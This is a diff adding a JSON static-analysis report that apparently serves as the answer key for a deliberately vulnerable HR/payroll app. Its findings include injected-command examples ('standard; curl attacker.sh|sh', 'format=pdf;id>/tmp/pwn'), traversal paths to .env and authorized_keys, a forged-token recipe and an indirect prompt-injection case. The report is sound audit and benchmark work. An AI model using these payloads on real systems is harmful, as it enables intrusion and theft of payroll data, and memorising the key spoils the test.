@@ -1,0 +1,650 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.authentication.password-reset-token-not-validated",
+      "path": "app/utils/auth.server.ts",
+      "start": {
+        "line": 44,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 50,
+        "col": 15,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePasswordResetAccount() receives submittedToken but never compares it against users.resetToken. The query only checks email and resetTokenExpiry > now. In app/routes/reset-password.tsx:51-102 the token is only checked for non-emptiness before the password is changed and the user is signed in. An attacker can POST intent=reset with any dummy token (e.g. 'x') plus the victim's email to set a new password and take over any account (including hr_admin), as long as a reset was requested within the 1-hour expiry window \u2014 and the attacker can trigger that reset themselves via the intent=request flow. Complete authentication bypass.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.jwt-alg-none-accepted",
+      "path": "app/utils/allocationLinks.server.ts",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveCostAllocationLink() verifies the shared snapshot token with algorithms: [\"HS256\", \"none\"]. When ALLOCATION_LINK_SECRET is unset (LINK_SECRET defaults to \"\"), jsonwebtoken accepts a forged alg:none token with no signature \u2014 verified empirically against the bundled jsonwebtoken 9.0.3. This function is called from app/routes/allocation.snapshot.tsx:36, whose loader performs NO authentication (no requireUser), then returns every employee's salary, bonus, and compensation status for the attacker-chosen departmentId in the forged payload. Unauthenticated access to sensitive payroll data. Contrast with resolveLedgerExportLink() which restricts to HS256 and requires a configured secret.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc",
+      "path": "app/utils/documentConversion.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 72,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocumentFormat() runs execSync(`pandoc ${sourcePath} -o ${outputPath} -t ${format}`) through a shell with the format argument interpolated unvalidated. It is called from app/routes/employee.documents.tsx:82,95 where format comes from the URL query parameter (?format=...), so ANY authenticated employee can inject shell commands (e.g. format=pdf;id>/tmp/pwn) achieving remote code execution. Contrast with convertPayslipFormat() which allowlists formats and invokes pandoc with shell:false",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-report-layout",
+      "path": "app/utils/reportRenderer.server.ts",
+      "start": {
+        "line": 27,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 105,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderReportWithLayout() passes `report-layout --in ${csvPath} --out ${outputPath} --preset ${layoutPreset}` to spawn(command, { shell: true }) (line 7). layoutPreset is attacker-controlled: app/routes/payroll.export.tsx:134 reads reportLayout from formData and passes it here at line 144 (payroll_report export). A value like 'standard; curl attacker.sh|sh' executes arbitrary shell commands as the server user. Contrast with renderReportWithLayoutSafe() which allowlists presets and disables the shell",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.filesystem.path-traversal-file-write",
+      "path": "app/utils/attachments.server.ts",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 29,
+        "offset": 0
+      },
+      "extra": {
+        "message": "storeRequestAttachment() builds the destination with path.join(REQUEST_ATTACHMENTS_DIR, originalName) using the raw client-supplied multipart filename, then calls fs.writeFileSync. A filename like '../../package.json' or '../../../.ssh/authorized_keys' escapes the request-attachments directory, giving any authenticated employee an arbitrary file write (overwrite app files, plant scripts). Called from app/routes/employee.requests.tsx:176 with attachment.name. Contrast with storeApprovalMemo() which applies path.basename()",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+            "CWE-73: External Control of File Name or Path"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.filesystem.path-traversal-directory-listing",
+      "path": "app/utils/departmentSharedDrive.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 31,
+        "offset": 0
+      },
+      "extra": {
+        "message": "listDepartmentSharedFiles() joins the caller-supplied folder directly under SHARED_DRIVE_ROOT and calls fs.readdirSync without any containment check. Via app/routes/manager.team.tsx:157-160 any manager can pass folder='../../etc' (or any traversal sequence) to enumerate arbitrary server directories, disclosing file names outside the shared drive. Contrast with listDepartmentSharedFilesSafe() which reduces the name with path.basename()",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.filesystem.path-traversal-file-read",
+      "path": "app/utils/policyTemplateLibrary.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 39,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadPolicyStarterTemplate() joins TEMPLATE_LIBRARY_DIR with the raw templateName and reads the file with fs.readFileSync, with no check that the resolved path stays inside the library. Via app/routes/admin.policies.tsx:77-81 an HR admin can pass templateName='../../.env' to read arbitrary files from the server (e.g. .env containing SESSION_SECRET and DATABASE_URL credentials). Contrast with loadPolicyStarterTemplateSafe() which verifies the resolved path is confined to the library",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authentication.jwt-decoded-without-verification",
+      "path": "app/utils/approvalDelegation.server.ts",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readApprovalDelegation() uses jwt.decode() instead of jwt.verify(), so the delegation grant's signature and expiry are never checked. app/routes/manager.approvals.tsx:73-77 feeds the attacker-controlled 'delegation' query parameter into it and, when grant.toManagerId matches the requester, scopes the loader to grant.fromManagerId \u2014 letting any manager forge a base64 token {\"fromManagerId\":\"<victim>\",\"toManagerId\":\"<self>\"} and view another manager's team pending onboarding tasks and compensation requests (salaries). Also relies on a hardcoded fallback secret 'delegation-default' (line 3). Contrast with readVerifiedApprovalDelegation() used for compensation sign-off",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-862: Missing Authorization",
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.loose-comparison-bypass",
+      "path": "app/utils/workflowConnector.server.ts",
+      "start": {
+        "line": 22,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 120,
+        "offset": 0
+      },
+      "extra": {
+        "message": "canAutoCompleteOnboardingTask() authorizes task auto-approval using result.access truthiness, '==' loose string comparison for actorRole, and parseInt() without radix for actorId. app/routes/employee.tasks.tsx:105-108 passes the fully client-controlled 'x-workflow-connector-result' request header here, so any employee can simply send {\"access\":true,\"actorRole\":\"hr_admin\",\"actorId\":\"<prefix-of-assignedById>\"} (parseInt collides on numeric prefixes of the expected UUID) and mark their own onboarding task approved without manager review. Trusted-client-data plus coercion bugs defeats the authorization check. Contrast with canAutoCompleteOnboardingTaskSafe() used in manager.approvals.tsx",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-480: Use of Incorrect Operator",
+            "CWE-863: Incorrect Authorization",
+            "CWE-602: Client-Side Enforcement of Server-Side Security"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.exposure.session-token-in-url",
+      "path": "app/utils/payrollProvider.server.ts",
+      "start": {
+        "line": 14,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 110,
+        "offset": 0
+      },
+      "extra": {
+        "message": "submitPayrollRecord() sends the caller's session token as an api_key URL query parameter via GET, and PROVIDER_BASE_URL defaults to plain http:// (line 1). app/routes/payroll.export.tsx:63-66 extracts the raw __session cookie value and forwards it to this external provider. The user's live session cookie is therefore transmitted in a URL (logged by proxies/servers) over unencrypted HTTP to a third party \u2014 a leaked value is a full session hijack. Contrast with submitBenefitsRecord() which uses HTTPS POST with an Authorization header",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method with Sensitive Query Strings",
+            "CWE-319: Cleartext Transmission of Sensitive Information",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.arbitrary-origin-reflection",
+      "path": "app/routes/partner.compensation-feed.tsx",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "attachCompensationFeedHeaders() reflects any request Origin into Access-Control-Allow-Origin and unconditionally sets Access-Control-Allow-Credentials: true. This permits any origin to make credentialed cross-origin reads of the department compensation feed (salaries) whenever the partner key is known/defaulted, and is a textbook permissive CORS policy. Contrast with partner.benefits-feed.tsx which only reflects origins on a fixed allowlist",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-default-api-key",
+      "path": "app/routes/partner.compensation-feed.tsx",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 7,
+        "col": 88,
+        "offset": 0
+      },
+      "extra": {
+        "message": "PARTNER_API_KEY falls back to the hardcoded value \"partner-feed-default\" when PARTNER_FEED_API_KEY is unset. The loader at lines 26-48 is the only auth gate for an endpoint returning every employee's salary, currency, and effective date by department \u2014 anyone who knows the public default key gets unauthenticated access to payroll data. The key is also compared with non-constant-time '===' (line 10)",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-default-api-key",
+      "path": "app/routes/partner.benefits-feed.tsx",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 7,
+        "col": 88,
+        "offset": 0
+      },
+      "extra": {
+        "message": "PARTNER_API_KEY falls back to the hardcoded default \"partner-feed-default\". If the environment variable is not configured, the employeeId/employmentStatus feed at lines 30-49 is accessible to anyone who knows the well-known default value",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-default-session-secret",
+      "path": "app/utils/auth.server.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 52,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The cookie session secret falls back to the hardcoded string \"dev-secret-change-me\" when SESSION_SECRET is unset. Because this value signs all session cookies (createCookieSessionStorage secrets), an attacker who knows it can forge a valid __session cookie for any userId and bypass authentication entirely. Production deployments that miss the env var silently run with a publicly-known secret",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-321: Use of Hard-coded Cryptographic Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-filter-injection",
+      "path": "app/utils/directoryService.server.ts",
+      "start": {
+        "line": 51,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 51,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory() interpolates the raw searchTerm into the LDAP filter string `(|(cn=*${searchTerm}*)(mail=*${searchTerm}*))` with no escaping. The search term originates from the manager-controlled 'directoryQuery' URL parameter (app/routes/manager.team.tsx:120-123). Special characters like () and * let the caller alter the filter structure (e.g. force-match all entries or inject additional assertions) against the corporate directory \u2014 the comment notes this mirrors the real ldapjs client used in production. Contrast with findUserByEmail() which escapes the value via escapeLdapFilterValue()",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.headers.response-header-injection",
+      "path": "app/routes/policies.tsx",
+      "start": {
+        "line": 94,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 94,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The acknowledgement certificate embeds the user-supplied 'document_title' query parameter (line 68) directly into the Content-Disposition response header without stripping CR/LF or quote characters. URL-encoded %0d%0a decodes to raw control characters in the header value, enabling HTTP response header injection / smuggling of additional header parameters. The sibling function exportDocumentReceipt() in app/routes/employee.documents.tsx:39-42 explicitly strips [\\r\\n] for the identical pattern, confirming this instance is unsanitized",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')",
+            "CWE-644: Improper Neutralization of HTTP Headers"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.handlebars-template-injection",
+      "path": "app/utils/policyNotice.server.ts",
+      "start": {
+        "line": 11,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 26,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPolicyAcknowledgementNotice() compiles policyContent (a DB-stored string) as a Handlebars template at request time. The content is executed server-side whenever any employee requests their certificate (app/routes/policies.tsx:72-78). Policy bodies that contain Handlebars expressions are evaluated as code against the runtime context, so a malicious or injected policy body becomes server-side template injection (historically exploitable to RCE in Handlebars). Contrast with renderAcknowledgementConfirmation() which compiles only a fixed constant template",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.mass-assignment",
+      "path": "app/utils/profileSync.server.ts",
+      "start": {
+        "line": 18,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 66,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyProfileSyncPayload() merges the raw JSON.parse'd payload over the entire employee row (Object.assign) and writes the result back with db.update(users).set(merged) \u2014 no field allowlist, so any column can be overwritten including role, passwordHash, resetToken, disabled, id, and filePath (which then feeds document download path construction). Called from app/routes/admin.employees.$id.tsx:247-250 with the HR-supplied 'payload' form field. Contrast with applyBenefitsProfileSync() which validates with a zod allowlist before updating",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cryptography.weak-random-password-generation",
+      "path": "app/routes/admin.import-export.tsx",
+      "start": {
+        "line": 29,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateBatchOnboardingPassword() builds the initial password for every imported employee from two Math.random().toString(36) concatenations. Math.random is not cryptographically secure, and a single shared password is issued for the whole batch (lines 290-329) \u2014 making bulk-imported accounts predictable/guessable and brute-forceable. The codebase elsewhere correctly uses node:crypto randomBytes for credentials (e.g. admin.employees.$id.tsx issueTemporaryCredential)",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
+            "CWE-521: Weak Password Requirements"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.client-header-disables-csp",
+      "path": "app/entry.server.tsx",
+      "start": {
+        "line": 20,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyPortalSecurityHeaders() removes X-Frame-Options and replaces the Content-Security-Policy with 'none' whenever the request carries the client-controlled header x-embed-context: benefits-partner (or NODE_ENV is not production). Any request can set this header, so framing and content-security protections can be silently downgraded for any response, enabling clickjacking and removal of CSP defenses at attacker discretion",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-693: Protection Mechanism Failure",
+            "CWE-16: Configuration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.notification-idor",
+      "path": "app/utils/notifications.server.ts",
+      "start": {
+        "line": 52,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 57,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "markAsRead() updates notifications purely by id with no userId scoping. app/routes/notifications.tsx:22-27 passes the user-supplied notificationId from the form directly, so any authenticated user can mark ANY other user's notification as read by guessing/knowing its UUID (broken object-level authorization). Contrast with markAllAsRead() which correctly scopes by userId",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.unbounded-reporting-chain-loop",
+      "path": "app/utils/orgChart.server.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "expandReportingChain() walks manager links in a while(currentId) loop with no depth cap or visited-set. managerId is freely assignable via admin.employees.$id.tsx update_profile, so a cycle in manager links (A manages B, B manages A) makes this loop never terminate, issuing DB queries forever and hanging the request worker. Triggered by the '?view=chain' loader at app/routes/admin.employees.$id.tsx:157-159. Contrast with expandReportingChainBounded() which caps depth at MAX_CHAIN_DEPTH",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-835: Loop with Unreachable Exit Condition ('Infinite Loop')",
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.llm.prompt-injection",
+      "path": "app/utils/requestAssistant.server.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 220,
+        "offset": 0
+      },
+      "extra": {
+        "message": "draftRequestReplySuggestion() inlines priorInternalNote and requestDescription directly into the LLM prompt with no system-level instruction isolating them as untrusted data. priorNote is attacker-supplied form input (app/routes/employee.requests.tsx:194-206), so a requester can steer/override the model's instructions (indirect prompt injection) once the real completion API is wired in. Contrast with draftOnboardingWelcomeNote() whose system prompt explicitly treats the task description as reference material and forbids following instructions in it",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.predictable-review-context-cookie",
+      "path": "app/utils/reviewContext.server.ts",
+      "start": {
+        "line": 22,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 110,
+        "offset": 0
+      },
+      "extra": {
+        "message": "beginCompensationReviewContext() derives the context id from `${departmentId}-${Date.now()}` \u2014 predictable and guessable \u2014 and sets the comp_review_ctx cookie without HttpOnly, Secure, or SameSite attributes. The id is returned to the client and stored in a readable, forgeable cookie (used via app/routes/manager.compensation.tsx:150-157). Contrast with beginLedgerReviewContext() which uses randomBytes(16) and HttpOnly; Secure; SameSite=Strict",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values",
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cryptography.unauthenticated-cbc-cursor",
+      "path": "app/utils/reviewContext.server.ts",
+      "start": {
+        "line": 54,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 68,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "encodeBatchReviewCursor()/decodeBatchReviewCursor() use AES-256-CBC without any message authentication (no HMAC/GCM), and decodeBatchReviewCursor returns a distinct error ('Resume cursor padding is invalid') for bad padding versus other parse failures (lines 62-67), leaking a CBC padding oracle to anyone who can submit cursor tokens (resume_review in app/routes/manager.compensation.tsx:161-168). Tampered/forged cursors cannot be detected. Contrast with encode/decodeLedgerReviewCursor() which uses AES-256-GCM with an auth tag and a single generic error",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
